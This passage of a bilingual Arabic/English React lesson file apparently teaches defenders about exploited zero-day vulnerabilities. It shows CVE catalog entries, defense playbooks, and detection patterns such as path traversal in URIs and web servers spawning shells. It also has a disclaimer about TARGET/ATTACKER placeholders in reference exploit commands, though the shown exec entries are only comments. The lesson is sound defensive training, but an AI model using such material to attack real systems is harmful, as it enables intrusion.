      `# Drive-by URL served by RomCom; chained with CVE-2024-49039 for SYSTEM.`,
    ],
    patch: { ar: "Firefox 131.0.2 / ESR 115.16.1 (أكتوبر 2024)", en: "Firefox 131.0.2 / ESR 115.16.1 (Oct 2024)" } },

  { id: "CVE-2024-7971 + CVE-2024-38178", year: 2024, sev: "high", product: "Chromium V8 + Windows Scripting Engine", cvss: "8.8",
    itw: "Citrine Sleet (DPRK) — Chrome zero-day chain",
    ar: { name: "Type confusion في V8 + خطأ في mshtml", how: "نوع خاطئ في V8 يخرج للمتصفح ثم يفتح IE mode → استغلال mshtml للخروج إلى الـ host." },
    en: { name: "V8 type confusion + mshtml bug chain", how: "V8 type confusion gets RCE in renderer; pivot via Edge IE-mode to mshtml for full host RCE." },
    exec: [
      `# Watering-hole HTML loaded via Edge IE-mode lure (DPRK financial theme).`,
    ],
    patch: { ar: "Chrome 128.0.6613.84 + Windows Aug 2024", en: "Chrome 128.0.6613.84 + Windows Aug 2024" } },
];

const SEV_CHIP: Record<Sev, string> = {
  critical: "chip chip-red",
  high: "chip chip-amber",
};

export default function Page() {
  const { lang } = useI18n();
  const isAr = lang === "ar";

  return (
    <LessonShell slug="zero-days">
      <L
        ar={
          <>
            <Section title="إيه هي ثغرات Zero-Day؟">
              <Analogy>
                صانع أقفال عمل قفل وفاكره آمن.
                لصّ اكتشف إن مفك معيّن بيفتحه.
                قبل ما الصانع نفسه ياخد باله.
                ده الـ zero-day.
                ثغرة عارفها المهاجم وبيستغلّها فعلياً (in-the-wild) قبل ما يطلع patch. اللحظة اللي الشركة بتطلع فيها الـ patch، الـ &quot;zero-day&quot; بتنتهي صلاحيته ويبقى n-day. بس قبل ما الكل يحدّث، لسه مفيد جداً جداً.

                - طب يعني المهاجم لما يطلع الـ patch بيرمي الثغرة؟؟

                يا مستجد، متوقّع. لأ مش بيرميها — بيستفيد منها أكتر. بنسبة 99% الناس مش بترقّع في 30 يوم. اللي كان zero-day الأسبوع اللي فات بقى n-day النهارده، وبيشتغل على نص الإنترنت لأن الـ patch ساكت في تيكت محدش فاتحه. اوعى تفتكر إن "اتطلع patch" = "خلصت اللعبة".
              </Analogy>

              <p className="opacity-80">
                مثال واقعي: في 2024، Ivanti Connect Secure ضربها CVE-2023-46805 + CVE-2024-21887 chain. UNC5221 (مجموعة صينية) كانت جوه شركات فيدرالية أمريكية لشهور قبل ما الـ patch يطلع. CISA أصدرت Emergency Directive في 24 ساعة. آلاف الـ VPN gateways اتخرقوا. ده مش سيناريو في فيلم — ده يومين الجمعة والسبت في يناير 2024.
              </p>

              <Callout kind="danger" title="قانوني — استخدام مصرّح بيه بس">
                كل اللي هنا موثّق علناً (CISA KEV، نشرات الموردين، تقارير الحوادث). بيتستخدم لتدريب فرق الحماية الحكومية واختبار الاختراق المصرّح بيه بس. تشغّل أي PoC ضد نظام مش معاك إذن صريح عليه = جريمة تحت قوانين مكافحة الجرائم المعلوماتية. مفيش لعب.
              </Callout>

              <p className="opacity-80">
                الكتالوج ده بيلخّص أبرز ثغرات Zero-Day الحديثة (2023–2026) اللي اتستغلّت في الميدان وطلع لها patches. لكل واحدة: المنتج، الـ CVSS، آلية الاستغلال، أمر تنفيذي مرجعي، ورقم الإصدار اللي رقّعها — علشان فرق الحماية تقدر تبني قواعد كشف وتتأكد إن الـ patch اتركّب فعلاً.
              </p>

              <Callout kind="danger" title="غلطات الـ junior في التعامل مع zero-days">
                <ul className="list-disc pe-6 space-y-1">
                  <li>بيستنّى &quot;الـ vendor يطلع patch&quot; قبل ما يعمل أي حاجة — اللي بيستنّى بيتخرق. اعمل compensating controls فوراً (block, isolate, monitor) من غير ما تستنّى.</li>
                  <li>بيرقّع KEV CVE واحدة وبينسى الباقي — CISA KEV فيها 1100+ ثغرة، تابعها يومياً مش أسبوعياً.</li>
                  <li>بيشغّل PoC على prod &quot;عشان يتأكد إنها مرقّعة&quot; — ده بيكسر الإنتاج. استخدم version check بدل exploit check.</li>
                  <li>بيعتمد على CVSS لوحده في الأولوية — CVSS مش بيشوف إن المنتج ده مفتوح على الإنترنت في شركتك. EPSS + KEV أفضل.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="موجة 2026 — أحدث ما يجب أن تعرفه">
              <Callout kind="warn" title="الأبرز هذا العام">
                <ul className="list-disc pe-6 space-y-2">
                  <li><b>CVE-2026-33824</b> — Double-free في Windows IKEv2: RCE قبل المصادقة عبر UDP/500-4500. مصنّفة wormable. أي host بدور VPN/IPsec في خطر.</li>
                  <li><b>CVE-2026-32201</b> — SharePoint spoofing: استُغلّت قبل صدور الرقعة، CISA حدّدت موعد ترقيع فيدرالي 2026-04-28.</li>
                  <li><b>CVE-2026-33825 (BlueHammer)</b> — LPE في Microsoft Defender نفسه: PoC نُشر على GitHub قبل الرقعة.</li>
                  <li><b>CVE-2026-32202</b> — تكرار لـ Outlook NTLM (CVE-2023-23397): الترقيع الأصلي كان ناقصاً، APT28 استغلّت الحقول البديلة.</li>
                  <li><b>سلسلة كروم</b>: 2026-3909 (Skia OOB write) + 2026-3910 (V8 type confusion) في مارس، ثم 2026-5281 (WebGPU/Dawn UAF) في أبريل — كلها استُهدفت ضد قطاع المال.</li>
                  <li><b>Cisco SD-WAN</b>: ثلاث ثغرات أُضيفت لـ KEV في فبراير، تشمل تجاوز مصادقة في vManage يسمح بإعادة تشكيل routers الفروع.</li>
                </ul>
              </Callout>
              <p className="opacity-80 mt-3">
                النمط واضح زي الشمس: <b>أجهزة الحافة وخدمات الـ kernel والمتصفحات</b> دول التلات جبهات الساخنة في 2026، مع ظهور لافت لـ <i>الترقيعات الناقصة</i> (Outlook) — نفس الخلل بيرجع بصياغة جديدة. الترقيع الناقص أخطر من إنه ما يطلعش أصلاً.
              </p>
            </Section>

            <Section title="جدول الثغرات">
              <ZdTable lang="ar" />
            </Section>

            <Section title="أنماط متكررة — اقرأها قبل أن تنسى التفاصيل">
              <ul className="list-disc pe-6 space-y-2 opacity-90">
                <li><b>أجهزة الحافة (Edge appliances)</b> الهدف رقم 1: Ivanti, Citrix, Palo Alto, Cisco — مكشوفة على الإنترنت ومش بتشغّل EDR. هدية مغلفة.</li>
                <li><b>سلاسل (chains)</b> أكتر من ثغرة واحدة: تجاوز مصادقة + RCE مع بعض (Ivanti, TeamCity, Confluence).</li>
                <li><b>أخطاء parser قديمة</b> بترجع: CLFS, IPv6, LDAP — كود kernel قديم ومعقد ومش بيتم اختباره زي الكود الحديث.</li>
                <li><b>ميزات setup/wizard مكشوفة</b> بعد التثبيت: ScreenConnect, Confluence, PaperCut — كلها فتحت الإعداد من غير مصادقة.</li>
                <li><b>تجاوز Mark-of-the-Web</b> هو سلاح Initial Access الذهبي للمجموعات الحكومية: SmartScreen, search-ms, WinRAR.</li>
                <li><b>قابلية الاستغلال الجماعي</b>: لما الاستغلال بيبقى بسيط (curl واحد)، العصابات بتنتشر في 24 ساعة من نشر الـ PoC. السرعة لعبة.</li>
              </ul>
            </Section>

            <Section title="الحماية — كيف توقف موجة Zero-Day التالية">
              <Callout kind="good" title="إجراءات تشغيلية بتشتغل">
                <ol className="list-decimal pe-6 space-y-2">
                  <li><b>تابع CISA KEV يومياً</b> — كل ثغرة في اللستة معاها deadline حكومي للترقيع، اعتبرها أولوية رقم 1.</li>
                  <li><b>اعزل سطح الإدارة</b>: متفتحش Web UI لأجهزة الشبكة (Cisco, Citrix, Ivanti) على الإنترنت. حطها ورا VPN منفصل أو IP allow-list.</li>
                  <li><b>مراقبة سلوكية مش توقيعية بس</b>: راقب إنشاء admins فجأة، عمليات shell طالعة من web services، اتصالات outbound من أجهزة الحافة.</li>
                  <li><b>قفل اللي مش بتستخدمه</b>: cups-browsed, RDS Licensing, IPv6 الخارجي، PHP-CGI — كل خدمة مقفولة دي 0-day مستحيلة.</li>
                  <li><b>قاعدة &quot;patch خلال 14 يوم&quot; لـ KEV</b>، 30 يوم للحرجة، 90 يوم للباقي — مع تتبّع SLA حقيقي مش على الورق.</li>
                  <li><b>EDR مع application allowlisting</b> على endpoints، خصوصاً ضد سلاسل MOTW bypass وLPE من CLFS/DWM.</li>
                  <li><b>قسّم الشبكة</b>: اعزل أجهزة الحافة عن باقي الشبكة الداخلية. استغلال Ivanti مش لازم يوصل لـ DC أبداً.</li>
                  <li><b>سجلات IPP/SMB/LDAP في مكان مركزي</b>: حزم زي CUPS UDP/631 أو Outlook → SMB خارجي = صرخة واضحة.</li>
                </ol>
              </Callout>

              <Callout kind="warn" title="مؤشرات IoC عملية">
                <ul className="list-disc pe-6 space-y-1">
                  <li>مستخدم admin جديد لم يُنشأ من قبل IT — تحقق فوراً (TeamCity, Cisco IOS XE, ScreenConnect).</li>
                  <li>طلبات HTTP تحتوي على path traversal مثل <code>../../</code> داخل URI لـ Ivanti أو Citrix.</li>
                  <li>عملية child من <code>w3wp.exe</code> أو <code>java</code> أو <code>perl</code> هي <code>cmd</code>/<code>powershell</code>/<code>sh</code>.</li>
                  <li>استدعاءات SMB خارجية من Outlook بدون سياق calendaring واضح (CVE-2023-23397).</li>
                  <li>تثبيت طابعة جديدة من جهاز Linux لم يطلبها أحد (CUPS).</li>
                </ul>
              </Callout>
            </Section>

            <Section title="مصادر للتحقق والبحث">
              <ul className="list-disc pe-6 space-y-1 opacity-90">
                <li>CISA KEV: cisa.gov/known-exploited-vulnerabilities-catalog</li>
                <li>Project Zero ITW 0-day tracking sheet (Google).</li>
                <li>Mandiant / Volexity / Watchtowr / Rapid7 advisories.</li>
                <li>MITRE ATT&CK Initial Access (T1190) و Exploitation for Privilege Escalation (T1068).</li>
              </ul>
              <Callout kind="info" title="الخلاصة الناشفة">
                الـ 0-day مش رعب. الـ 0-day اللي ما اتطفّتش حتى بعد 30 يوم من الـ patch — ده الرعب الحقيقي. شغلك مش إنك تمنع الـ 0-day؛ ده مستحيل. شغلك إنك تكتشفها بسرعة، تحجّم الضرر، وتقفلها قبل ما تنتشر.
                اكتبها على شاشة الـ NOC: اللي بيتأخّر في الـ patching أكتر من اللي بيتعرّض لـ 0-day.
                وأنت ونصيبك — إما عندك SLA حقيقي، أو الـ Ivanti بتاعك مكشوف لـ Mandiant بدل ما تبقى أنت اللي شايفه.
              </Callout>
            </Section>
          </>
        }
        en={
          <>
            <Section title="What is a Zero-Day?">
              <Analogy>
                Imagine a locksmith makes what they think is a secure lock — and a thief discovers a particular screwdriver
                opens it. <i>Before the locksmith knows.</i> That's a zero-day: a vulnerability the attacker is using in the
                wild before any patch exists. The moment the vendor ships a fix, it stops being "0-day" and becomes "n-day"
                — but until everyone updates, it stays extremely useful to attackers.
              </Analogy>

              <Callout kind="danger" title="Legal — authorized use only">
                Everything below is publicly documented (CISA KEV, vendor advisories, incident reports). It is provided
                for training authorized government defenders and authorized penetration testing only. Running any of
                these PoCs against a system you do not own or have explicit written authorization for is a crime under
                computer-misuse laws.
              </Callout>

              <p className="opacity-80">
                This catalog covers recent zero-days (2023–2026) exploited in the wild and now patched. For each entry
                we give product, CVSS, mechanics, a reference exec line, and the patch version — so blue teams can build
                detections and confirm patches landed.
              </p>
            </Section>

            <Section title="2026 spotlight — what's burning right now">
              <Callout kind="warn" title="The 2026 highlights">
                <ul className="list-disc ps-6 space-y-2">
                  <li><b>CVE-2026-33824</b> — Windows IKEv2 double-free: pre-auth RCE over UDP/500-4500, rated wormable. Any host with the VPN/IPsec role exposed is at risk.</li>
                  <li><b>CVE-2026-32201</b> — SharePoint spoofing: exploited before patch, CISA federal deadline 2026-04-28.</li>
                  <li><b>CVE-2026-33825 (BlueHammer)</b> — LPE in Microsoft Defender itself; PoC posted to GitHub before the patch shipped.</li>
                  <li><b>CVE-2026-32202</b> — Outlook NTLM redux of CVE-2023-23397: Microsoft's original fix missed alternative reminder fields, and APT28 walked through.</li>
                  <li><b>Chrome chain</b>: CVE-2026-3909 (Skia OOB write) + CVE-2026-3910 (V8 type confusion) in March, then CVE-2026-5281 (WebGPU/Dawn UAF) in April — all aimed at financial-sector targets.</li>
                  <li><b>Cisco SD-WAN</b>: three flaws added to KEV in February, including a vManage auth bypass that lets an attacker reconfigure branch routers.</li>
                </ul>
              </Callout>
              <p className="opacity-80 mt-3">
                The pattern is clear: <b>edge appliances, kernel services, and browsers</b> are the three hot fronts in 2026,
                with a striking trend of <i>incomplete patches</i> (Outlook) — the same root flaw returning under a new
                surface.
              </p>
            </Section>

            <Section title="The catalog">
              <ZdTable lang="en" />
            </Section>

            <Section title="Recurring patterns — read this before you forget the details">
              <ul className="list-disc ps-6 space-y-2 opacity-90">
                <li><b>Edge appliances</b> dominate: Ivanti, Citrix, Palo Alto, Cisco — internet-exposed and EDR-free.</li>
                <li><b>Chained bugs</b> beat single bugs: auth-bypass + RCE together (Ivanti, TeamCity, Confluence).</li>
                <li><b>Old parsers keep coming back</b>: CLFS, IPv6, LDAP — legacy kernel code that wasn't fuzzed as hard as new code.</li>
                <li><b>Setup/wizard endpoints</b> exposed post-install: ScreenConnect, Confluence, PaperCut — all let unauth users re-run setup.</li>
                <li><b>Mark-of-the-Web bypasses</b> are the gold standard for state-actor initial access: SmartScreen, search-ms, WinRAR.</li>
                <li><b>Mass exploitability</b>: when the exploit is one-curl simple, ransomware crews catch up within 24 hours of public PoC.</li>
              </ul>
            </Section>

            <Section title="Defense — how to stop the next 0-day wave">
              <Callout kind="good" title="Operational playbook">
                <ol className="list-decimal ps-6 space-y-2">
                  <li><b>Watch CISA KEV daily.</b> Every entry has a federal patch deadline — treat it as priority #1.</li>
                  <li><b>Isolate management surfaces.</b> Never expose Web UIs of Cisco / Citrix / Ivanti / Palo Alto to the open internet. Put them behind a separate VPN or IP allow-list.</li>
                  <li><b>Behavioral over signature.</b> Alert on sudden new admin users, shells spawned by web services, outbound from edge appliances.</li>
                  <li><b>Disable what you don't use.</b> cups-browsed, RDS Licensing, external IPv6, PHP-CGI — every disabled service is an unexploitable 0-day.</li>
                  <li><b>Patch SLA:</b> 14 days for KEV, 30 days for Critical, 90 days for the rest — measured, not aspirational.</li>
                  <li><b>EDR + application allowlisting</b> on endpoints, especially against MOTW-bypass chains and CLFS/DWM LPE.</li>
                  <li><b>Network segmentation.</b> An Ivanti compromise must not reach the DC.</li>
                  <li><b>Centralize IPP / SMB / LDAP logs.</b> Things like CUPS UDP/631 or Outlook reaching out via SMB are loud signals.</li>
                </ol>
              </Callout>

              <Callout kind="warn" title="Practical IoC patterns">
                <ul className="list-disc ps-6 space-y-1">
                  <li>A new admin user not created by IT — investigate immediately (TeamCity, Cisco IOS XE, ScreenConnect).</li>
                  <li>HTTP requests containing path traversal (<code>../../</code>) inside Ivanti or Citrix URIs.</li>
                  <li>Process tree where parent is <code>w3wp.exe</code>, <code>java</code>, or <code>perl</code> and child is <code>cmd</code>/<code>powershell</code>/<code>sh</code>.</li>
                  <li>Outbound SMB from Outlook with no clear calendaring context (CVE-2023-23397).</li>
                  <li>A new printer auto-installed on a Linux host nobody asked for (CUPS).</li>
                </ul>
              </Callout>
            </Section>

            <Section title="Where to verify and dig deeper">
              <ul className="list-disc ps-6 space-y-1 opacity-90">
                <li>CISA KEV: cisa.gov/known-exploited-vulnerabilities-catalog</li>
                <li>Project Zero ITW 0-day tracking sheet (Google).</li>
                <li>Mandiant / Volexity / Watchtowr / Rapid7 advisories.</li>
                <li>MITRE ATT&amp;CK — Initial Access (T1190), Exploitation for Privilege Escalation (T1068).</li>
              </ul>
            </Section>
          </>
        }
      />
    </LessonShell>
  );

  function ZdTable({ lang }: { lang: "ar" | "en" }) {
    return (
      <div className="space-y-4">
        {ZDS.map((z, i) => {
          const t = lang === "ar" ? z.ar : z.en;
          return (
            <div key={z.id + i} className="rounded-xl border border-white/10 bg-[#0d1424] p-4">
              <div className="flex flex-wrap items-center gap-2 mb-2">
                <span className={SEV_CHIP[z.sev]}>{z.sev.toUpperCase()}</span>
                <span className="chip">CVSS {z.cvss}</span>
                <span className="chip chip-amber">{z.year}</span>
                <span className="font-mono text-sm opacity-90">{z.id}</span>
                <span className="opacity-60">·</span>
                <span className="opacity-90">{z.product}</span>
              </div>
              <div className="font-semibold mb-1 flex items-center gap-2">
                <Flame className="w-4 h-4 text-red-400" />
                {t.name}
              </div>
              <p className="opacity-85 mb-2">{t.how}</p>
              <p className="text-sm opacity-70 mb-2">
                {lang === "ar" ? "استغلال ميداني: " : "ITW: "}
                <span className="opacity-90">{z.itw}</span>
              </p>
              <Code lang="bash">{z.exec.join("\n")}</Code>
              <p className="text-sm mt-2 opacity-80 flex items-center gap-2">
                <ShieldAlert className="w-4 h-4 text-cyan-300" />
                {lang === "ar" ? "الإصدار المرقَّع: " : "Patched in: "}
                <span className="opacity-100">{lang === "ar" ? z.patch.ar : z.patch.en}</span>
              </p>
            </div>
          );
        })}
        <div className="rounded-lg border border-amber-400/30 bg-amber-400/5 p-3 text-sm opacity-90 flex items-start gap-2">
          <AlertTriangle className="w-4 h-4 mt-0.5 text-amber-300 shrink-0" />
          <span>
            {isAr
              ? "كل الأوامر أعلاه مرجعية لفهم الآلية فقط. استبدل TARGET / ATTACKER بقيم بيئة معملية تملكها أو معتمدة."
              : "All commands above are reference-only to illustrate mechanics. Replace TARGET / ATTACKER with values from a lab you own or are authorized to test."}
          </span>
        </div>
      </div>
    );
  }
}
